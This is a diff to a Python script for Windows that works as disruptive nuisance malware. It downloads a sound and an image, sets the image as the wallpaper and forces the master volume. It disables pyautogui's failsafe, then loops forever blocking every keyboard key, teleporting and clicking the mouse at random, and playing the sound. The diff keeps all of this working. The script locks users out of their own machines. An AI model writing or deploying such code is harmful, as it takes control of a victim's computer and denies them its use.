@@ -2,17 +2,17 @@ import os
 import requests as req
 import ctypes
 import keyboard as k
-import pygame
+import playsound
 import mouse
 import random
-import time
 import pyautogui
 from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume    
-
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+import time
 
 pyautogui.FAILSAFE = False
+
 
 all_keys = [
     'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
@@ -21,14 +21,12 @@ all_keys = [
     'esc', 'tab', 'caps lock', 'shift', 'ctrl', 'alt', 'space', 'enter', 'backspace', 'delete', 'insert',
     'home', 'end', 'page up', 'page down', 'pause', 'print screen',
     'up', 'down', 'left', 'right',
-    'num lock', 
+    'num lock',
     'insert', 'scroll lock', 'print screen', 'windows', 'menu', 'application'
 ]
 
-
 screen_width = 1920
 screen_height = 1080
-
 
 link = 'https://www.myinstants.com/media/sounds/rap-gemi2.mp3'
 musres = req.get(link)
@@ -43,7 +41,6 @@ if musres.status_code == 200:
         file.write(musres.content)
 else:
     print('Failed to get music.')
-
 muspath = os.path.abspath(r'rap-gemi2.mp3')
 
 
@@ -53,37 +50,35 @@ if res.status_code == 200:
         file.write(res.content)
 else:
     print('Failed to get picture.')
-
 path = os.path.abspath('2xx9de.png')
 
 
-
-pygame.init()
-pygame.mixer.init()
 ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
+
 
 
 def teleport_mouse():
     x = random.randint(0, screen_width)
     y = random.randint(0, screen_height)
     mouse.move(x, y)
-    
+
+
+
 
 devices = AudioUtilities.GetSpeakers()
 interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
 volume = cast(interface, POINTER(IAudioEndpointVolume))
-volume.SetMasterVolumeLevel(0.0, None)
-sound = pygame.mixer.Sound(muspath)
-sound.play()
+volume.SetMasterVolumeLevel(-20.0, None)
 
 
+ 
 while True:
+    for key in all_keys:
+        k.block_key(key)
+    volume.SetMasterVolumeLevel(-20.0, None)
     teleport_mouse()
     time.sleep(0.1)
     pyautogui.click()
-    
-    for key in all_keys:
-        k.block_key(key)
-    
 
     
+    playsound.playsound(muspath)
